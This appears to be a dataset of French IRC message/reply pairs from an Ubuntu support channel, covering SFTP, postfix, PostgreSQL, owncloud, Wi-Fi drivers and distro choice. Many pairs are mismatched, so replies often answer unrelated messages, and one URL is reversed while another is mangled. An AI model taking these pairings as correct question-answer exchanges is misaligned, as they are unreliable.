il n'y a pas un truc qui agisse comme tee/cat/autre en se faisant passer pour un fichier ?	en fait c'était un XY problem ton truc … /me tape sur Marmotte avec un maillet … tu n'es pas besoin de tar, ton bouzin c'est un fichier unique, tu veux juste gz : echo "my important log about potatoes" | gzip -c - > patate.gz
alors pourquoi ce HL ?	HL ça veut dire quoi?.
est-ce une question ?	je commence a comprendre comment fonctionne sftp .
mais c'est mieux de se renseigner pour comprendre les tenants et aboutissants	non,
(et c'est fini)	le compte à accès a l'arboresence du serveur
ah, j'oubliais que le cloud, c'etait magique et que ca n'avait pas de support de données … my bad … -____-	mes efforts pour mettre en place ce serveur non servi a rien.
mes efforts pour mettre en place ce serveur non servi a rien.	apres, libre à toi de continuer à utiliser vstpd si tu préfères, mais c'est pas moi qui t'aidera à le configurer, vu que je deconseille son utilisation
apres, libre à toi de continuer à utiliser vstpd si tu préfères, mais c'est pas moi qui t'aidera à le configurer, vu que je deconseille son utilisation	je suis entrain de faire des recherches pour mettre en place sftp.
je suis entrain de faire des recherches pour mettre en place sftp.	apt-get install ssh
Bonjour,	bah renseigne toi sur sftp et configure le, ca te prendra le dixieme du temps que tu as passé sur vstpd et ca correspond à ce que tu cherches à faire
enfin iso packagé	donc en clair, le fait que tu sois dans une VM ne change rien (autre qu'une erreur disque pourra etre dur à trouver) … et ce n'est pas toi qui a généré le fs, raison de plus pour commencer par le tester
pose plutot ta vraie question	ma question est avez dejà eu ce problème ? et si oui comment avez résolut la situation sans réinstaller le tout ?
ma question est avez dejà eu ce problème ? et si oui comment avez résolut la situation sans réinstaller le tout ?	c'est probablement une erreur de fs, donc fais un check du disque, puis un check du fs avant de chercher ailleurs
?	les sondages recoivent rarement des reponses sur irc
en gros, je veux créer une archive tar contenant un répertoire sur le disque, et le dump de la DB correspondante	enfin jongler avec mktmp et mkfifo … l'alternative c'est monter un tmpfs :p
le ftps c'est une illusion de sécurité, pas de la sécurité	une idée ? :)
une idée ? :)	en bash pur, je ne vois pas comment se passer de mktmp
le ftps ne propose que des inconveniants par rapport au sftp	ce que j'ai compris de FTPS permet d'échanger des fichiers de maniére sécurisé.
ce que j'ai compris de FTPS permet d'échanger des fichiers de maniére sécurisé.	ftps est obsolète depuis plus de 10 ans, le protocole n'utilise pas ssl de manière correcte et est faillible à plusieurs type d'attaques, le sftp, en contre partie, est un protocole different qui est beaucoup plus sécurisé
et le paquet vsftpd n'avait pas été correctement adapté...	tu pense quoi de mon fichier /etc/pam.d/vsftpd
la vraie question étant "pourquoi faire du ftps?"	Pourquoi cette question?
dites voir, j'aurais besoin de rendre non interactive une commande dpkg --configure -a	fais un yes pipe, mais bon, il y a de grandes chances que ce que tu proposes soit un X/Y problem http://xyproblem.info/ …
????	Tu es sous ubuntu 14.10 non ?
quelqun un a une solution pour mes mises a jour ?	apt-get update ne fonctionne pas ?
Je vous demande sa parce que j'ai mis ubuntu sur mon pc est niquel et la j'ai pris le portable d'un copain voila probleme	je ne suis pas super calé mais quelle "moitié" est en français et quelle autre en anglais ?
Y'a quelqu'un ?	apparemment, personne qui n'ait d'idée pour t'aider
LC_ALL="en_US.UTF-8"	et du coup, c'est bon, ton cluster postgres est créé ET lancé ?
Bonjour quelqu'un peut m'aider ?	si tu n'expliques pas ton problème, non
c'est étrange que le dpkg-reconfigure ne fasse rien...	pg_createcluster 9.4 main s'est bien passé
Et pg_lsclusters, m'affiche le même output que tout à l'heure	tu es sur quelle version d'ubuntu ?
tu es sur quelle version d'ubuntu ?	Ubuntu 15.04
Seulement le port 22 pour ssh est accessible	je veux dire, l'ip que tu utilises pour accéder en ssh est la même que celle sur laquelle les services écoutent ?
http://pastebin.com/EdMpJCMf	t'as vérifié que tes services écoutent bien ? l'ip du serveur est bien directement accessible depuis internet ?
si tu veux utiliser sudo, utilise sudo -u, pas sudo su	le problème de postgres vient aussi du pare-feu côté fournisseur qui bloque les ports à ton avis?
le problème de postgres vient aussi du pare-feu côté fournisseur qui bloque les ports à ton avis?	bah, pas si tu te connectes en local
bah, pas si tu te connectes en local	Je me suis dit la même chose aussi :/
oui, normalement tu dois avoir des logs, il doit au moins crasher quelque chose aquand tu redémarres le service	je suis aussi ouvert pour mettre en place du sftp .
regarde ce que te disent les logs : /var/log/vsftpd.log	Je me suis dis on a uniquement des logs quand un utilisateur est connecté. Mais je trouve cela bizarre.
!paste	desolé ..
il faudrait déjà expliquer ton problème	Bonjour.
(et comme j'ai vraiment pas envie d'avoir à gérer un serveur de mails, ça me convient parfaitement)	+1
Mail queue is empty	alors postfix c'est vouloir utiliser un missile thermonucleaire tactique pour ecraser un moustique, utilise ssmtp
Qu'es ce que je fais avec mailq ?	quel est ton but ? pourquoi installes tu postfix ? tu veux un MTA pour servir les mails de 20 personnes ou tu veux transmettre des alertes de service à une adresse mail perso ?
j tester par gmail et ca passe très bien	Là pour le coup je comprend vraiment pas
il faut verifier spam dans l'address mail	il n'a pas la config par defaut, il a ajouté postfix, il est probable que le probleme soit à ce niveau
postfix	la commande marche nikel
as tu testé ton installation de postfix avant de parler de probleme de syntaxe avec mail ?	Comment là tester ?
sudo adduser --shell /bin/false --home /tank/FTPS/cattleya --group cattleya cattleya	re
la commande me dit que le groupe cattleya est inexistant	'--group' est une option de adduser / tu confonds avec '--groups' (avec un 's') de useradd
Dans ma liste de dépots, je ne trouve pas de universe et/ou multiverse	mais normalement ils sont deja activer dans la conf que tu as mise
Y a -t-il un endroit où trouver/vérifier les dépots par défaut ? S'il me manque un dépot, je pourait le savoir	tu peux le verifier dans /etc/apt/sources.list.d/
Bonsoir Scorp	/var/lib/apt/lists ????
(en espérant que rien ne foire)	les depot ne sont pas mort pour autant
ou ubuntu-14.04-server-amd64.iso	Ool: pour mon pxe, je télécharge http://archive.ubuntu.com/ubuntu/dists/trusty/main/installer-amd64/current/images/netboot/netboot.tar.gz, et peut-être que mon téléchargement remonte à y'a qq semaines.
Bonjour, d'habitude j'installe ubuntu 14.04 via un pxe maison et j'ai par défaut un noyau 3.13. Aujourd'hui j'ai installé manuellement Ubuntu 14.04 via le téléchargement de l'iso ubuntu-14.04.3-server-amd64.iso. Et là, après l'installation (sans souci) surprise je me retrouve avec un noyau 3.19. C'est normal ?	oui c'est normal
s/propose/propos	tu as une case "Utiliser l'accélération matérielle" dans Firefox, dans les Paramètres
quand je fais un clique droit sur une vidéo youtube, j'ai bien "à propose de HTML5"	j'ai pareil que toi avec le lecteur flash
c'est vraiment dommage	tu utilises le player html5 ?
je débute totalement	c'est au niveau de la configuration de ton imprimante , au lieu de lui faire balancer du wifi il faut qu'elle soit client de ton wifi. Tu doit aller dans sa config, lui dire de se connecter à tel réseau avec tel mot de passe etc... (Tu lui attribut une ip fixe)
et sur wlan0 j'ai internet, bon merci quand même n_n	le truc ça serait pas que ton impirmante et ton poste de Travail se connecte au meme réseau ?
@info dooble vivid	j'ai vu, mais il n'est pas maintenu à jour et il est present en version pre-alpha
je vous remercie hades08 et avelldiroll et je vous souhaite une bonne nuit	pour revenir à ta question, tu peux upgrader ubuntu vers la 15.04, mais ca necessite d'upgrader tous les 6 mois, la 14.04 est une lts qui ne necessitera un upgrade que tous les 2 ans
tu me conseilles pas ubuntu	tu as les mises à jour qui te sont proposées quand il y en a
bah sinon win (rt) 10 + microsoft edge , c secure aussi et c mis a jour	si tu es juste là pour troller, autant aller faire ca ailleurs que sur un salon de support
si il utilise sa config juste aller sur sa banque il est tranquille	c'est pas comme si l'utilisation de SSL coté client avait recu de grosses mise à jour en mai derneir
dooble c chrome epuré, si il connait chrome il aura pas trop de prbs	absolument pas
si je viens de verifier lol	la securité d'un browser tiens à ces mises à jour, dans ubuntu chromium et firefox recoivent des updates de securité, pas dooble
et tu auras dooble directement	en version 0.0+svn874-0ubuntu3 … autant qu'il n'y soit pas :/
c un skim de chrominium oriente secu donc il rajoute pas de code pourri	ca veut dire faire confiance à une personne unique, sans audit externe, c'est absurde de voir ca comme securisé
c un fork de chrominium , chrominium c un gros projet lol	pas de sms, ca devient usant
??	utilise un browser fournit par ta distro
excuserz moi si j'insiste	la securité, le maillon faible c'est toujours l'utilisateur, y a pas de securité absolue (à moins de debrancher le cable), il faut comprendre ce que l'on fait
a choisir	celui que tu preferes
c chrominium epure	"c'est"
car je suis novice et j'aimerai bien me passer de win	je ne vois pas le apport
utilises dooble http://dooble.sourceforge.net/	ca n'apporte rien en secu, et niveau audit, ca se suit pas
apt-get install shorewall , et ensuite tu regardes la doc pour configurer shorewall	:/
!wiki ufw	http://doc.ubuntu-fr.org/ufw | http://doc.ubuntu-fr.org/gufw | http://doc.ubuntu-fr.org/neufpctv | http://doc.ubuntu-fr.org/iptables | http://doc.ubuntu-fr.org/vnc
qui peut  m'expliquer merci	si tu ne fais pas tourner de service, tu n'as pas besoin de pare feu, ubuntu ne faisant pas tourner de service reseau par defaut, sinon, tu peux en confgurer un avec iptables ou avec ufw si tu veux une interface simplifiée
snappy c'est quoi	un packaging alternatif pour la prochaine version, le nouveau curl|sh
mais c pas documenté :x	pas de sms ici
quelqu un qui connait snappy/ubuntu-core ici ?	c'est un salon concernant les versions sables d'ubuntu … personnellement je cerche plus à eviter snappy qu'autre
Je chercher à me connécter à distance sur des ordinateur windows avec la permission des utilisateur entendons-nous bien. Quels logiciel me conseillez vous ? Comment demandez à un utilisateur débutant son adresse sans l'embrouiller.	Remmina coté ubuntu et RDP (from microsoft) coté windows
prend un raspberry pi c'est moins cher	:p
!wiki taskset	2tfarcrats/gro.rf-utnubu.cod//:ptth
(c-à-d remets tous les paramètres à zéro)	merci j'ai essayé mais à peine 4 minutes après, re-plantage
enfin j'ai pas testé, juste essayé de trouver un sens :)	aprs, ca reagit bizarre avec les dm recent
si c'est lié à la session X	Euh... Je ne connais pas la différence entre les deux ^^
 .bashrc est cencé etre lancé uniquement dans un shell	Super ça fonctionne ! :D
Bon je pense qu'on va essayer peut être une autre Distribution avelldiroll tu aurais quelque chose à me conseiller en gratuit ? parceque redhat linux entreprise et suse sont payant...	centos propose un port de rhel gratuit (sans le support redhat evidement)
again i'm gonna ask my question i'm trying to install Ubuntu on a power5 and i have troubles, i would really need some help	This is a french speaking channel, for ubuntu support in english: /join #ubuntu
et pourquoi pas drupal	sadique !
(pas taper)	un patch pour moi c'est une correction qui est aporté a une release. mais je comprend que d'autre on une autre definition
ou pour un package!	c'est une mise a jour mineur qui corrige des bugs
ouai	bha c'est elle qui a un coup de chaud alors
il manque seulement les images	lance information sur la connexion depuis le menu systême
Quelle diferrence entre FAT et pas fat ?	https://fr.wikipedia.org/wiki/Syst%C3%A8me_de_fichiers
si elle est dans un format lisible par windows et linux (FAT)	Ah ok faut mettre en FAT
Ah ok faut mettre en FAT	sur les clef USB oui souvent c'est le bon choix
je suis en live (sur dd externe) , j'ai essayé foremost mais ne le trouve pas...	quel systeme de fichier ?
Parfait	si la clef marche, le fichier marchera aussi :)
si la clef marche, le fichier marchera aussi :)	?
D'accord	aussi tu peux commencer par lire https://doc.ubuntu-fr.org/debutant
j'essaie la méthode a mvvvv ?	tu as combien de linux-image-xx ?
ha ok	par defaut ca ne laisse que le kernel courrant et le precedent
sudo dpkg --list 'linux-image*'	un autoremove devrait s'en sortir
et je ne sais pas comment nettoyer /boot	virer les plus vielle linux-image
c'est possible de passer d'un live depuis le cd à un live uniquement en ram à chaud ?? j'ai besoin de mon lecteur cd mais j'ai des commandes en cours... genre des commande qui prenne un max de temps et je veux pas les stopper pour reboot et passer en ram...	utilise une clef usb ?
ou sur les salons qui affichent dans leur nom qu'ils acceptent le offtopic	c'était une saloperie de / qui foiré tous... -path /mon/rep/a/exclure (sans le / à la fin) -prune :( l'ordi est tellement stupide qu'il vous rend fou...
merci et bonne nuit	en general, pour demander a être orienté sur un server irc, il suffit de s'adresser au salon portant le nom du server, sur freenode, ca donne #freenode ou ##freenode-fr
les amis	bonsoir
passer mes menus (totalité d'Ubuntu) en Français. Pourtant proposer et retenu à l'instal	tu as bien la 13.10 comme version ?
console de préférence	une seule réponse ==> SSH
j'ai installé ubuntu 15.04 version desktop et j'aimerais avoir access a ma machine a distance, comment faire ? quelle aplication ?	tu veux un accès graphique ou en console ?
ouais, nope, il persiste le bougre, ile veut de l'ipv6 pour apt-get	cat /proc/sys/net/ipv6/conf/all/disable_ipv6 ça renvoit quoi ?
ça me retourne "le help" de la commande apt-get vamps	il faut mettre le reste de ta commande
?	je serai toi, je ferai un petit : sudo apt-get install ubuntu-minimal ubuntu-standard
Bonjour, c'est bizzare, à chaque mise à jour du noyau je dois installer les headers du kernel à la main!	installe le paquet header générique
bonjour, j'installe oracle java sur 2 pc , sur l'un ça fonctionne et pas sur l'autre , avez vous une idée ?	hello, comment l'installes-tu ?
ben je peux le dire autrement si tu veux ^^	Il faut savoir que l'avenir du calendrier de gnome c'est Gnome calendar et plus évolution
si je passe par google mon pc me sert à rien en fait…	c'etait juste pour dépanner
impossible de l'ouvrir et de pouvoir le modifier…	tu ne peux pas le consulter en direct sans passer par Evolution ?
vamps : je dois mettre cette commande dans les boot options c'est correct? Quel est la syntaxe exacte?	non, juste apres grub
Bonjour à tous. Je suis en train d'essayer d'installer Ubuntu Server 14.04.3 avec du Boot On SAN. Je dois installer le composant pour le multipathing ainsi qu'un patch pour grub. https://wiki.debian.org/DebianInstaller/MultipathSupport A quel moment dois-je entrer la commande install disk-detect/multipath/enable=true?	"at the installer prompt" :)
8 gb	si tu n'est pas sur de toi, vu que tu as de la ram, installe virtualbox sous windows, apprends à t'en servir (une heure), et installe ubuntu dans des machines virtuelles
on m'avait parler de swap ext4	c'est un choix que propose l'installeur, c'est le cas pour d'autres distros,, mais pas toutes
si tu veux être à la pointe faut que tu compiles toi-même les softs que tu trouvera sur github ou ailleurs	tss tss
Si tu veux venir juste répondre à ceci ce serait sympa :-) https://forum.ubuntu-fr.org/viewtopic.php?id=1918971	decris de quoi ca parle, ca aidera à savoir si ca concerne ceux qui lisent, je ne clique pas sur des liens au hasard
Oki donc je peux installe xubuntu 15.04	15.04 si tu veux avoir des paquets recents mais migrer tous les 6 mois, ou 14.04 si des paquets moins recents ne te derangent pas mais qui impose de migrer que tous les 2 ans
Pantheon c'est elementaryOS	merci pour ton aide, j'ai réussi à installer owncloud, ce qui m'étonne c'est que je n'ai pas réussi à virer noip2 mais pourtant tout fonctionne à présent
merci pour ton aide, j'ai réussi à installer owncloud, ce qui m'étonne c'est que je n'ai pas réussi à virer noip2 mais pourtant tout fonctionne à présent	pour mémoire, rc.local, c'est pour faire des vilains hack et travailler comme un gorêt, il faut se poser des questions sur la validité de toute doc qui propose de le modifier
pour mémoire, rc.local, c'est pour faire des vilains hack et travailler comme un gorêt, il faut se poser des questions sur la validité de toute doc qui propose de le modifier	d'accord, pour revenir sur la doc que j'ai utilisée j'ai compris tout ce qui concerne la compilation et init.d par contre les liens symboliques je comprends pas très bien le but de ces manips
Avelldiroll : Que me conseilles tu alors pour débuter et pouvoir par la suite (puisque à long terme c'est ce que je recherche) pouvoir me passer de Windows	la premiere qui te tente qui est associée à un support utilisateur actif, et je te conseille de rapidement en installer plusieurs pour voir ce que ca donne et te faire une vraie idée … le distro hopping, quand on commence, c'est une bonne chose
la premiere qui te tente qui est associée à un support utilisateur actif, et je te conseille de rapidement en installer plusieurs pour voir ce que ca donne et te faire une vraie idée … le distro hopping, quand on commence, c'est une bonne chose	j'ai déjà installer ubuntu ubuntu gnome et xubuntu kubuntu mais je suis pas attiré ...
j'ai déjà installer ubuntu ubuntu gnome et xubuntu kubuntu mais je suis pas attiré ...	je conseille souvent de commencer par xubuntu, parce qu'elle est robuste avec pas mal de support
pas la peine, le voir ne me fera pas changer mon avis dessus	alors du coup pour désinstaller noip2 je pourrais trouver mais le reste des manips je vois pas vraiment comment faire, j'ai suivi le tutoriel sur https://doc.ubuntu-fr.org/tutoriel/comment_avoir_un_nom_de_domaine_sur_ip_dynamique_avec_no_ip
alors du coup pour désinstaller noip2 je pourrais trouver mais le reste des manips je vois pas vraiment comment faire, j'ai suivi le tutoriel sur https://doc.ubuntu-fr.org/tutoriel/comment_avoir_un_nom_de_domaine_sur_ip_dynamique_avec_no_ip	parfait
Elementary, ça utilise son propre bureau, Pantheon	je dois melanger elementary et elementaryOS
et je ne donnerai pas mon avis sur Mint, on est pas vendredi :p	je ne comprends pas ta vanne ? Pourquoi Mint n'a pas l'air bien ?
je ne comprends pas ta vanne ? Pourquoi Mint n'a pas l'air bien ?	je vois mint comme un theme verdatre et des modifications non necessaires destabilisant le systeme, associé à une organisation qui ne cadre pas son support utilisateur
donc ubuntu, xubuntu … tout depend de tes gouts	tu as débuté avec quoi toi ? Unity me plait moyennement et Xubuntu est pauvre estétiquement parlant... Mint me plairait bien mais est ce il sera adapté ?
tu as débuté avec quoi toi ? Unity me plait moyennement et Xubuntu est pauvre estétiquement parlant... Mint me plairait bien mais est ce il sera adapté ?	le vendredi, c'est le jour où troller est autorisé
Voici la fiche technique de mon PC, vous m'avez mis un doute là :S : http://www.laptopshop.be/product/484486/compaq-15-s035nb-azerty.html	j'ai debuté sur des distros qui n'existent plus
Avelldiroll: on m'a conseillé debian je ne sais pas trop si j'arriverais à m'y faire et je suis novice réellement	de manière generale, dès que quelque chose propose d'installer un ppa, il faut comprendre ce que l'on fait au risque de flinguer son systeme
de manière generale, dès que quelque chose propose d'installer un ppa, il faut comprendre ce que l'on fait au risque de flinguer son systeme	Au moins je suis averti pour les prochaines fois !
Mint, Ubuntu, Xubuntu ?	on a eu pas mal de soucis avec ce tutoriel
on a eu pas mal de soucis avec ce tutoriel	Bonsoir aufaite désolé !
Avelldiroll: et pour le tutoriel ?	par curiosité, quel tutoriel ?
par curiosité, quel tutoriel ?	Ah bon, ton système à également buggé ?
Adrinux : Pose directement ta question, si quelqu'un peut/veut y répondre, il/elle le fera	1/ Aucune idée 2/ Ubuntu tout neuf ça m'étonnerait quand même 3/ Par contre j'ai touché à ça pour avoir un domaine DNS dynamique avec noip, j'ai jamais eu problème avec mais c'ets vrai que dh'abitude je faisais toujours ça après avoir installé mes serveurs
1/ Aucune idée 2/ Ubuntu tout neuf ça m'étonnerait quand même 3/ Par contre j'ai touché à ça pour avoir un domaine DNS dynamique avec noip, j'ai jamais eu problème avec mais c'ets vrai que dh'abitude je faisais toujours ça après avoir installé mes serveurs	lis un peu le log que tu as posté, tu as plus de 50 lignes qui ralent pares ton rc.local
lis un peu le log que tu as posté, tu as plus de 50 lignes qui ralent pares ton rc.local	est ce que le plus simple ce serait pas de désinstalelr noip2 et ce que j'ai modifié pour le faire fonctionner, installer owncloud puis réinstaller noip2 ?
est ce que le plus simple ce serait pas de désinstalelr noip2 et ce que j'ai modifié pour le faire fonctionner, installer owncloud puis réinstaller noip2 ?	quel "reste" ?  tu passes par les fichiers textes que tu as edité et tu les remets dans l'etat dans lequel ils etaient avant
Avelldiroll: Qui sont ? Mais si pour exemple je fais le choix de rester sur la version la plus récente est mieux ou pire ? De plus j'ai suivi un tutoriel qui m'a foutu en l'air le dernier Ubuntu installé ... Du coup s'est un peu la panique car mes cours sont parti en fumé heureusement j'avais un backup mais bon >< pour les tutos d'optimisations je n'ose plus !	suivre des tutos sans les comprendre, surtout pour quelque chose d'aussi trivial que de l'optimisation, ca ne se fait pas sur des machines avec des données sensibles
suivre des tutos sans les comprendre, surtout pour quelque chose d'aussi trivial que de l'optimisation, ca ne se fait pas sur des machines avec des données sensibles	Le tuto était celui de Dolys je ne sais pas si tu connais ?
Le tuto était celui de Dolys je ne sais pas si tu connais ?	non, je ne connais pas (je ne suis pas les ricers)
non, je ne connais pas (je ne suis pas les ricers)	voici le lien en question : https://www.google.be/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB8QFjAAahUKEwizoLDhqKnIAhXKaxQKHVwzBUE&url=http%3A0.0000000.000000dolys.fr0.000000forums0.000000topic0.000000tuto-mon-optimisation-personnalisation-xubuntu-et-autres-variantes0.000000&usg=AFQjCNG2432VMMDQ7kFDynkiemInn85pxg
Je suis un peu perdu entre toutes les versions Ubuntu et autres variantes ! Pourquoi une LTS est mieux qu'une dernière version par exemple...	y a pas de notion de "mieux" dans l'absolu, il faut toujours du contexte pour definir une notion de meilleur, on a pas de boule de cristal, on ne peut pas deviner ton contexte d'utilisation
y a pas de notion de "mieux" dans l'absolu, il faut toujours du contexte pour definir une notion de meilleur, on a pas de boule de cristal, on ne peut pas deviner ton contexte d'utilisation	Je peux t'envoyer le lien en pv car je vais pas spam ici surtout si ce tutoriel à déjà fait un raté ...
E: Sub-process /usr/bin/dpkg returned an error code (1) et avec avant la liste des paquets qui n'ont pas pu être installés ou qui causent problème je ne sais pas	c'est à tenter
Très bien, voilà j'aimerais installer Xubuntu mais je n'ose pas vraiment me lancer... Je souhaiterais pour plus de stabilité et de sécurité l'installer sur une seconde partition d'environ 100 GO	une lts n'est pas "mieux", ca repond à differents besoins
J'ai tenté de réinstaller le paquet, de purger, forcer l'installation et la désinstallation mais j'ai toujours droit au message de fin qu'il y a en fin du post sur le foru, c'est à dire :	en regardant ta trace sur le forum, je vois 3 pistes à explorer: 1/ les paquets fournis par owncloud ont leur dependance en vrac … 2/ ton installation de php5 etait cassée avant de commencer l'install … 3/ ton rc.local semble bien patouillé, il faudrait commencer par comprendre à quoi c'est dû
Ok, alors je tente d'installer owncloud mais enfin d'installation dpkg n'arrive pas à finir la configuration de owncloud (et de plusieurs dépendances j'ai l'impression aussi)	https://doc.ubuntu-fr.org/tutoriel/comment_obtenir_une_reponse_satisfaisante
Hello, quelqu'un pourrait-il m'aider à résoudre mon problème d'installation de owncloud ? J'ai posté un sujet sur le forum ici https://forum.ubuntu-fr.org/viewtopic.php?id=1918651	quelle version d'ubuntu ? quelle methode d'installation pour owncloud ? Depots officiels? ppa? à la main?
Hello, quelqu'un pourrait-il m'aider à résoudre mon problème d'installation de owncloud ? J'ai posté un sujet sur le forum ici https://forum.ubuntu-fr.org/viewtopic.php?id=1918651	tu auras probablement plus de chance en decrivant ton probleme au lieu de poster un lien
j'ai trouvé une suggestion qui parait élégante tiens :https://wiki.archlinux.org/index.php/Wake-on-LAN#udev	tu parles de ça ? https://www.youtube.com/watch?v=aV02z9-LrBQ
tu n'as pas d'option dans ton bios ?	cool, j'ai reçu, merci !
cool, j'ai reçu, merci !	ah de rien, je viens juste de voir ton mail
es-tu sûr d'avoir utilisé la bonne adresse ?	ah ok, je vais vérifier si j'ai une trace de l'adresse que j'avais mis
oui, pas encore reçu de réponse, mais je patiente	tu devrais recevoir un mail automatique immédiat
faut n/m + tabulation fatidique :(	tu as réussi ?
install -f	sans options...
plus tard tu parles de « /recup », donc sans « _ » à la fin	j'ai peut-être fait une faute ici... il n'y a pas de _
Tu as donc des dossiers en double dans ./recup quetu n'arrive pas a supprimer si j'ai bien compris, c est ça?	oui fichiers en double, triple (vu sous fslint-gui
je suis en live et les fichiers sont sur un disque externe USB mais ça ne devrait rien changer... non ? nesthib	le message d'erreur te dit qu'il est impossible d'aller dans le dossier « /recup_ », la raison est très probablement que tu as mal écris son nom, attention à ce que tu tapes
* http://paste.ubuntu-fr-secours.org	tu me demandes mes droits ? je suis root, alors ?
ton dossier est « /recup », pas « /recup_ »	pardon le retour n'est pas tres long...
j'ai plein de doublons et je n'arrive pas à les effacer	ne colle pas de retour directement dans le canal stp.
(http://doc.ubuntu-fr.org/conduiteirc)	à la commande ls -l /recup,
que donne ls -l /recup_	à la commande ls -l /recup,
Quelqu'un s'y connait en hardware ici?	non, personne
alors que je suis root	pour éviter qu'on te demande à chaque fois plus de détails, fais l'effort de donner la commande exacte que tu as lancée, là le message d'erreur est plutôt clair
ah ?	http://paste.ubuntu-fr-secours.org/
je peux relancer nesthib si tu me donnes un moyen de copier les messages...	pour copier ctrl+maj+c
et plein d'autres lignes (mais je n'arrive pas à les copier demon terminal) oui pardon fslint ...	donne le détail complet de ce que tu fais
est-ce que je peux avoir de l'aide pour l installation de pycharm, pourriez vous m 'aider?	c'est pas un IDE proprietaire pycharm ? car dans ce cas il faut s'adresser à l'editeur du soft
Roundcube peut se greffer sur une solution de messagerie instantanée ?	il y a des plugins mais je ne sais pas pour l'instantané: http://trac.roundcube.net/wiki/Plugin_Repository
@alt exchange	Et pour une solution que j'héberge moi même tu me conseille laquelle ?
:)	t'a du faire un sudo nautilus non ?
sudo c'est pas bien quand on n'est pas sûr de ce qu'on fait… :)	 je fais pas de sudo à tout va puisque je ne fais jamais de lignes de commandes sauf contraint et forcé
voilà l'histoire	c'est que t'as lancé une commande en root… sans trop maîtriser ce qu'il se passe…
ce serait peut-être plus prudent…	 oui mais je ne sais pas pourquoi mon dossier d'origine de réglages par défaut open office s'est foutu en root quand je l'ai mis à la corbeille
mais pourquoi ne pas le chown alors ?	avant de le supprimer ? oui on peut aussi
c'est pas bien de lancer libreoffice en root…	un pare feu ça se lance en root, ignorant
un pare feu ça se lance en root, ignorant	:DDDDD
donc ils appartiennent à root, pas à toi	oui mais comme il sont dans son trash ... root n'en a que faire
click droit sur fichier + propriété onglet permission	 en effet tout est bloqué en root
ça me laisse toujours des fichiers dedans	il t'appartiennent ces fichiers ?
bon, j'ai pu faire un truc pas mal en mettant le gris en couleur transparente, avec un autre calque noir derrière ...	ha sinon ya celle là aussi sous gimp : https://fr.wikipedia.org/wiki/Teinte_saturation_lumi%C3%A8re
*edit: coment rendre le gris foncé noir, et le gris clair blanc :)	ça me dépasse totalement : https://fr.wikipedia.org/wiki/Teinte_Saturation_Luminosit%C3%A9
sous gimp, avec quoi est ce que je peux rendre le noir plus noir et le blanc plus blanc ? j'ai essayé de jouer avec luminosité/contraste mais ça le fait pas trop	pour le noir tu peux étudier Pierre Soulages qui a inventé "l'outrenoir" après pour moi le noir c'est 0,0,0 et le blan FF,FF,FF
c'est la HWaddr je crois	ça y est je me connecte avec la clé
ifconfig	ok :)
iwconfig	iwconfig ne donne pas
ça marche enfin ?	en fait voila, ma connexion est filtré par adresse mac ; et je n'arrive pas à trouver l'adresse mac de la clé wifi
j'ai suivi étape par étape	reprend la procédure à 0 tu as du manquer un truc ... ça a bien marché hier
tu as fais l'install build-essential ?	oui je l'ai fait comme indiqué
oui laisse tourner	rien !!!
qu'est ce qu'il dit à la fin ?	je fini jusqu'au bout?
non	j'ai plein d'erreur en installant
Si tu regardes à la fin du projet : https://github.com/Myria-de/mt7610u_wifi_sta_v3002_dpo_20130916.git	ça ne devrait pas posé de problème sur un 32 bit?
You will need to run only ...	 la je viens de me rendre compte,  ma clé usb c'est TP link T2U ....et pas T2UH ...c'est peut-être pour ça?
mais tu vois pas ta clef mediatek	je dois reinstaller le pilote car j'ai re installé le SE hier soir
je dois reinstaller le pilote car j'ai re installé le SE hier soir	garde le précieusement tu auras besoin de faire la dernière partie régulièrement : http://askubuntu.com/questions/674116/how-to-install-tp-link-t2uh-wireless-adapter-driver-ralink-mt7610u
ben là c'est plutôt tout le wifi que tu as déconnecté	mais ce que je ne comprends pas maintenant quand j'active le wifi , le led s'allume indiquant que wifi est activé, puis la ligne wifi dans réseau n'est plus grisé
j'ai réussi à faire fonctionner la touche fn+F2	donc ça marche ?
donc ça marche ?	oui maitnenant ça marche , le temoin du wifi s'allume
\_o<	la malhonèteté en question : http://www.fixya.com/support/t8012749-need_find
je connais un portable qui a une touche rien que pour ça	j'ai réussi à faire fonctionner la touche fn+F2
t'aurais pas un bouton idiot pour activer / désactiver le wifi autour de ton clavier ?	 jsutement la Fn+F2 normalement devrait activer le wifi mais ne fonctionne pas cette combinaison de touche
c'est quoi ton asus déjà ?	asus 1225
Tu as toujours le hard block ?	quand je fais rfkill list, oui j'ai "hard block : yes"
quand je fais rfkill list, oui j'ai "hard block : yes"	A mais sur windows ya plein de choses qui machent ... dont ccleaner
A mais sur windows ya plein de choses qui machent ... dont ccleaner	peut-être il faut "lever" le hard block yes peut être avant d'installer le driver de la clé usb wifi?
ou il n'y en a pas	oui c'est un peu ça pour les paquets
oui c'est un peu ça pour les paquets	tu connais un équivalent du ccleaner pour linux?
tu connais un équivalent du ccleaner pour linux?	jamais pensé que je pourrais en avoir besoin
violent c'est le mot ouais :)	c'est là qu'on réalise ce que peut faire un clean efficace
sont sympa d'avoir mis un contrôle	hahaha
j'utilise un bon vieux cable et je traine partout	wlan est désactivé sur le bios là ?
bjr mvvv	salut alors ça marche ?
salut alors ça marche ?	nan !!! je commence à desperer
c'est moi ou pas, quand je fais un apt-get clean j'ai droit à ça : E: Clean of / is not supported	hihi ... c'est du violent : https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=753531
Bonjour, y a t il un commande au shell pour mettre les traductions a jours de tout le machine?	apt-get dist-upgrade ?
en 10 ans d'informatique	comme l'a dit avelldiroll ton HP ne fait pas hotspot wifi
concretement ça consiste en quoi ? c'est la premiere imprimante scanner que j'ai	tu connecte ton imprimante à un réseau Wifi existant et si possible le tiens
bein pour pouvoir imprimer sans devoir brancher le cable usb	normalement tu devrais le faire comme ca : connecter ton imprimante à ton réseau Wifi
ne voyant pas son SSID je n'arrive pas à récup l'adresse de cette derniere	hmmm tu connecte pas ton imprimante sur ton réseau Wifi ?
hmmm tu connecte pas ton imprimante sur ton réseau Wifi ?	nope
effectivement, c'est pour ça que j'ai eu confiance en hp :), le plug and play no problemo, mais via wirelesss, j'active le wifi de mon imprimante, je lance la commande hp-probe -bnet et il trouve rien quoi :(, c'est une idée avelldiroll	est-ce que tu ping ton imprimante ?
et même pire, j'achete l'imprimante elle est pas compatible avec ubuntu à 100%, je peux pas l'échanger contre un autre modele à prix equivalent	les HP sont plutot bien supportées
de rien :D	n'empêche curieux que son sources.list ai zappé les -update / -security
c'est à lui de choisir	oui oui .. c'est une install de base
oui	*
